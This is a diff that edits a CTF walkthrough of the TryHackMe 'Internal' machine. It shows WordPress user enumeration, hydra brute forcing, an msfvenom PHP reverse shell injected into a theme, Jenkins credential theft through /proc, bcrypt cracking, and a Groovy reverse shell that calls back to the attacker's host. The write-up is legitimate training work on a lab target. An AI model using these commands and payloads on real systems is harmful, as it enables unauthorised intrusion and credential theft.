@@ -9,16 +9,16 @@ draft: false
 ---
 
 ## Introduction:
-The Internal host took me almost 24 hours to complete just due to the sheer number of hops required to complete it. Unlike many of the other boot2roots I've completed on THM, this host required review of logs and the host above and beyond the results of automated enumeration tools like linPEAS. I enjoyed this host immensely and I thought it was incredibly brilliant machine. 
+The Internal host took almost 24 hours to complete due to the sheer number of pivots required to complete it. Unlike many of the other boot2roots I've completed on THM, this host required a significant amount of review and manual poking around on the host above and beyond the results of automated enumeration tools like linPEAS. I enjoyed this host immensely and I thought it was incredibly brilliant machine. 
 
 ## Environment
-The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. Information on the host was extremely limited other than that there would be two flags available corresponding to a user and root flag. It was also known that the host contained a web application, and that the host, known by the vhost internal.thm, was the only host in scope.
+The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. Information about the host was extremely limited other than that there would be two flags available corresponding to a user and root flag. It was also known that the host contained a web application, and that the host, known by the domain internal.thm, was the only host in scope.
 
 ## Attack 
-Prior to starting the attack, I prepared my attack host by setting up burpsuite, installing the certificates in firefox and defining the scope to include only the target host. I also opened msfconsole and configured it to connect to a postgres backend of msfdb. I also went ahead and installed, `jq`, [gobuster](https://github.com/OJ/gobuster) and the awesome [seclists](https://github.com/danielmiessler/SecLists) collections. Finally I added internal.thm to my hosts file mapped to the target IP per the provide scope document.
+Prior to starting the attack, I prepared my workstation by setting up burpsuite, installing the certificates in firefox and defining the scope to include only the target host. I also opened msfconsole and configured it to connect to a postgres backend of msfdb. I also installed `jq`, [gobuster](https://github.com/OJ/gobuster) and the [seclists](https://github.com/danielmiessler/SecLists) wordlist collections. Finally I added `internal.thm` to my hosts file mapped to the target IP per the provide scope document.
 
 ### Host enumeration
-I started the attack by running an nmap scan against the host which identified only 2 listening ports on ssh and http while also confirming that this host was running linux.
+I started the attack by running an SYN and version and OS scan against the host which identified only 2 listening ports on ssh and http while also confirming that this host was running linux.
 
 ```
 msf5 > db_nmap -sS -sV -O 10.10.215.86
@@ -48,14 +48,14 @@ msf5 > db_nmap -sS -sV -O 10.10.215.86
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
 ```
 
-To confirm there was nothing running on hidden ports I ran a broader scan against all 65535 ports but found that it returned nothing more that the above and have omitted the results for that reason.
+To confirm that there was nothing else running on hidden ports, I ran a broader scan against all 65535 ports. Yet, I found that it returned nothing more that the above and have omitted the results for that reason.
 
-### Investigating the webpage
-I then opened the webpage available in the browser and found that I was given the default apache page for ubuntu.
+### Investigating the webserver
+I then decided to move to the webserver and, after opening up the site index, found that I was given the default apache page for ubuntu.
 
 ![webserver index page](/img/internal_http_index.png)
 
-I decided to run `gobuster` with the `directory-list-2.3-medium.txt` wordlist to attempt to attempt to find anything else that could be sitting on the webserver.
+I assumed that there were more directories unlisted and decided to run `gobuster` with the `directory-list-2.3-medium.txt` wordlist to attempt to attempt to find anything else that could be sitting on the webserver.
 
 ```
 root@kali:~/ctf# gobuster dir -u 'http://10.10.215.86' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
@@ -82,16 +82,16 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-I was lucky to find what looked like two potential paths forward, a blog running wordpress and a phpmyadmin panel. I decided to take a look at the blog to start.
+I was lucky to find what looked like two potential paths forward, a blog running wordpress and a phpmyadmin panel. I decided to take the happy path aproach and have a look at the blog to start.
 
 ### Investigating the wordpress blog
-The wordpress blog appeared pretty bog standard after opening the page, appearing to be not much more than a default install.
+The wordpress blog appeared pretty bog-standard after opening the page, looking to be nothing more than a default install of wordpress.
 
 ![wordpress index](/img/internal_http_blog_index.png)
 
-I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run `wpscan` against it to see if anything significant jumped out at me. Quickly it identified that this was wordpress `5.4.2` but gave little else that was actionable for the attack.
+I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run `wpscan` against it to see if anything significant jumped out at me. Quickly the scan identified that this was wordpress `5.4.2` but gave little else that was actionable for the attack.
 
-With the defined I decided to attempt to see if there was any information that I could pull from the api endpoint before looking at other vectors.
+With the scan turning up little, I decided to attempt to pull user information from the wordpress api endpoint before looking at other vectors.
 
 ```
 root@kali:~/ctf# curl -sI http://10.10.215.86/blog/?author=1
@@ -132,10 +132,10 @@ root@kali:~/ctf# curl -s http://internal.thm/blog/index.php/wp-json/wp/v2/users 
 ]
 ```
 
-Luckily this gave me a username, `admin`, which I decided to start a hydra attack against while I investigated other vectors.
+Luckily this gave me a username, `admin`, which I decided to attempt to bruteforce while I investigated other vectors.
 
 ### Bruteforcing the admin wordpress user
-I pulled the post-form fields from burpsuite and crafted a hydra attack using the `rockyou.txt` wordlist for password parameters before stepping away to pour a cup of coffee.
+I pulled the `wp-login` post-form fields from burpsuite and crafted a hydra attack using the `rockyou.txt` wordlist for password parameters before stepping away to pour a cup of coffee.
 
 ```
 root@kali:~/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.215.86 http-post-form '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:is incorrect'
@@ -150,14 +150,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-05 05:17:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-05 05:19:49
 ```
 
-By the time I had returned I found that the bruteforce had yielded the password `my2boys` which I was able to confirm allowed me access to the admin panel.
+By the time I'd had returned I found that the bruteforce had yielded the password `my2boys` which I was able to confirm allowed me access to the admin panel.
 
 ![wordpress admin panel](/img/internal_http_wp_admin.png)
 
 ### Popping a shell through wp admin
-Once I had access to the admin panel, I decided to generate a reverse meterpreter shell that could be injected into the theme.
+With access to the admin panel, I decided to generate a reverse-tcp meterpreter shell that could be injected into the theme.
 
-I generated a `php/meterpreter/reverse_tcp` shell using `msfvenom` and backed up the index.php theme before replacing it with the generated shellcode.
+I generated a `php/meterpreter/reverse_tcp` shell using `msfvenom` and backed up the index.php theme template before replacing it with the following generated shellcode.
 
 ```
 root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.253.137 LPORT=4444
@@ -170,7 +170,7 @@ Payload size: 1114 bytes
 
 ![wordpress template injection](/img/internal_http_wp_shell_injection.png)
 
-Prior to saving the theme I prepped a listener in using the `exploit/multi/handler` in metasploit to catch the new meterpreter session.
+Prior to saving the theme, I prepped a listener in using the `exploit/multi/handler` module in metasploit to catch the new meterpreter session.
 
 ```
 msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
@@ -182,7 +182,7 @@ msf5 exploit(multi/handler) > run -j
 [*] Started reverse TCP handler on 10.10.253.137:4444
 ```
 
-I then refreshed the site index and began preparing to migrate the incoming shell to a new process not attached to the php session using the `multi/manage/shell_to_meterpreter` module.
+I then refreshed the site index and prepared the `multi/manage/shell_to_meterpreter` module to migrate the incoming shell to a new process not attached to the php session. 
 
 ```
 msf5 post(multi/manage/shell_to_meterpreter) > 
@@ -242,7 +242,7 @@ meterpreter > download internal_local_enum.txt
 [*] download   : internal_local_enum.txt -> /root/ctf//internal_local_enum.txt
 ```
 
-I combed through the results and found that it was a linux host, specifically `Ubuntu 18.04.4`. That the host contained an additional unprivileged users with a shell, `aubreanna`, appeared to be running `docker`, appeared to be running a significant number of locally bound services and finally that the host appeared to be running jenkins as the `aubreanna` user. With the assumption being that one of these locally bound services was the jenkins portal.
+I combed through the results and found that the host contained an additional unprivileged users with a shell, `aubreanna`, appeared to be running `docker`, appeared to be running a significant number of locally bound services and finally that the host appeared to be running jenkins as the `aubreanna` user with the assumption being that one of these locally bound services was the jenkins portal.
 
 ```
 ====================================( System Information )====================================
@@ -302,7 +302,7 @@ aubrean+  1540  0.5 12.1 2587808 248012 ?      Sl   04:08   0:27 java -Duser.hom
 message+   909  0.0  0.2  50060  4664 ?        Ss   04:08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyql     1099  0.2 11.2 1165848 229308 ?      Sl   04:08   0:14 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
 ```
 
-I decided to take a look in the `/var/jenkins_home/` directory to see if I could find any configuration for the jenkins host but found that it didn't exist, giving more credence to it running in a docker container. I similarly looked under `/etc/` and found nothing related to jenkins, finally under `/opt/` I stumbled on a `/opt/wp-save.txt` file that netted a set of credentialls for the `aubreanna` user.
+I decided to take a look in the `/var/jenkins_home/` directory to see if I could find any configuration for the jenkins host but found that it didn't exist, giving credence to it running in a docker container. I similarly looked under `/etc/` and found nothing related to jenkins, finally I looked under `/opt/` and stumbled on a `/opt/wp-save.txt` file that netted a set of credentialls for the `aubreanna` user.
 
 ```
 meterpreter > cd /opt
@@ -324,7 +324,7 @@ aubreanna:bubb13guM!@#123
 meterpreter >
 ```
 
-I attempted to login with the provided credentials via ssh and was pleased to receive a shell which quickly netted the user flag and confirmed that jenkins was running in docker and gave me a host/port pairing.
+I attempted to login with the provided credentials via ssh and was pleased to receive a shell that quickly netted the user flag, confirmed that jenkins was running in docker and provided me a host/port pairing in the docker bridge network's subnet.
 
 ```
 root@kali:~/ctf# ssh aubreanna@10.10.215.86
@@ -365,7 +365,7 @@ Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
 ### Connecting to jenkins
-Prior to starting user enumeration, I decided to setup ssh port-forwarding so that I can easily connect back to the jenkins host that was bound to `127.0.0.1:8080` on the target host which I bound to port `8888` on my own host.
+Prior to starting enumeration of the aubreanna user, I decided to setup ssh port-forwarding so that I could easily connect back to the jenkins host that was bound to `127.0.0.1:8080`. Due to an already running conflict with burp, I bound it to port `8888` locally.
 
 ```
 root@kali:~/ctf# ssh -L 8888:127.0.0.1:8080 -N -f aubreanna@10.10.215.86
@@ -393,7 +393,7 @@ Uploading /root/Desktop/PEASS/linPEAS/linpeas.sh to /home/aubreanna/linpeas.sh
 aubreanna@internal:~$ ./linpeas.sh > aubreanna_local_enum.txt
 ```
 
-But upon further inspection found that it confirmed a lot of information that I had already known. However, I remembered that the jenkins container was running under the same user as aubreanna and I decided to see if I could access any of the filesystem through `/proc`. I attempted to navigate to the jenkins process and found that I was able to access the root of the of the namespace where I was quickly able to leak the jenkins admin credentials.
+But upon further inspection found that it confirmed a lot of information that I had already known. However, I remembered that the jenkins container was running under the same uid as aubreanna and I decided to see if I could access any of the filesystem through `/proc`. I attempted to navigate to the jenkins process and found that I was able to access the root of the of the namespace where I was quickly able to leak the jenkins admin credentials.
 
 ```
 aubreanna@internal:/proc/1506/root$ ls
@@ -421,7 +421,7 @@ aubreanna@internal:/proc/1506/root/var/jenkins_home/users$ cat admin_31904944046
 ```
 
 ### Cracking the Jenkins admin credentials.
-I pulled the bcrypt has from above and fed it into `john`, again running it against the `rockyou.txt` wordlist to see if I could find a matching set of credentials. Almost instantaneously it returned a collision for the password `spongebob`.
+I pulled the bcrypt hash from above and fed it into `john`, again running it against the `rockyou.txt` wordlist. Almost instantaneously it returned a collision for the password `spongebob`.
 
 ```
 root@kali:~/ctf# echo 'admin:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe' > jenkins_admin.txt
@@ -438,12 +438,12 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-I validated I was was able to login with this new set of credentials.
+I validated I was was able to login with this new set of credentials and was pleased to access the jenkins admin panel.
 
 ![jenkins admin](/img/internal_http_jenkins_admin.png)
 
 ### Popping a shell in jenkins
-While I had access to the jenkins filesystem, there were still some directories that I was unable to see so I decided to open a shell up into the container. With admin access, I decided to try using the groovy shell to open a session and prepared another metasploit listener to catch a shell.
+While I had access to the jenkins filesystem, I decided to open a shell into the container via the groovy shell for further enumeration. I prepared another listener to catch the shell.
 
 ```
 msf5 exploit(multi/handler) > run -j
@@ -453,7 +453,7 @@ msf5 exploit(multi/handler) > run -j
 [*] Started reverse TCP handler on 10.10.253.137:4444 
 ```
 
-I also prepared an example shell from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) which i pmupt into the groovy script console of jenkins.
+I also prepared an example shell from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) which entered into the groovy script console of jenkins.
 
 ```
 String host="10.10.253.137";
@@ -464,7 +464,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ![groovy shell payload](/img/internal_http_jenkins_groovy_injection.png)
 
-Soon after executing the payload I caught ont he listener and quickly migrated it using the `shell_to_meterpreter` module. I now had an open shell as the `www-data` user as well as an open shell into the jenkins container.
+After executing the payload I caught the response on my new listener and migrated it using the `shell_to_meterpreter` module which gave me a second open meterpreter session on the host.
 
 ```
 msf5 exploit(multi/handler) > [*] Command shell session 3 opened (10.10.253.137:4444 -> 10.10.215.86:57730) at 2020-12-05 06:16:05 +0000
@@ -527,10 +527,10 @@ need access to the root user account.
 root:tr0ub13guM!@#123
 ```
 
-Luckily this ended yielding a set of root credentials which I could have, ironically, obtained without going through all the trouble of popping another shell.
+This, much to my surprise, ended up yielding a set of root credentials which I could have, ironically, obtained without going through all the trouble of popping another shell.
 
 ### Root shell
-With the new root credentials, I decided to `su` from my aubreanna shell and quickly found the final set of root credentials.
+With the new root credentials, I `su`'d from my aubreanna shell and quickly found the final root flag in `root.txt`.
 
 ```
 aubreanna@internal:~$ su -
@@ -540,4 +540,4 @@ root.txt  snap
 ```
 
 ## Summary
-I don't think this walk through effectively captures the amount of time that I spent poking around at each level of local enumeration. In my first run through I spent a significant amount of time poking around both on the blog and within the blog's webroot as well as within the mysql database and phpmyadmin panels. However this host did teach me to never underestimate the power of a uid/gid collision.
+I don't think this walk through effectively captures the amount of time that I'd spent poking around at each level of local enumeration. In my first run through, I'd spent a significant amount of time walking through directories externally on blog, internally in the blog's webroot as well as within the mysql database and phpmyadmin panels. This was repeated after popping a shell in the extensive time spent walking through service configurations and poking at the locally-bound services. It wasn't until I'd slowed down and started looking for out of place files that I'd stumbled on the `notes.txt` file in `/opt`. 
